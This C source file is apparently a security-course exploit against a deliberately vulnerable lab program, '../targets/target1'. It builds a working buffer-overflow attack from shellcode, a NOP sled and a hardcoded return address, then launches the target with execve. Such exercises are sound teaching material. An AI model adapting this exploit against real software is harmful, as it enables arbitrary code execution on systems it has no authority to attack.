#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

// 46th byte is null in shell code
#define SHELL_LENGTH 45 
// NO-OP operation 
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	// NULL out executing variables
	args[2] = NULL;
	env[0] = NULL;

	// Initialize explit string
	char attack_buff[124];
	
	// zero out attack_buff for sanity
	bzero(attack_buff, 124);
	
	// concat shellcode to exploit
	strcat(attack_buff, shellcode); 

	// set NOP from end of SHELL_LENGTH to the 120th byte
	memset(&attack_buff[SHELL_LENGTH], NOP, 120 - SHELL_LENGTH);

	// overwrite return address with buf start address
	char* target_addr = (char*)0x2021fe50; 

	// fill final byte with return address
	memcpy(&attack_buff[120], &(target_addr), sizeof(target_addr));

	args[1] = attack_buff;

	if (execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
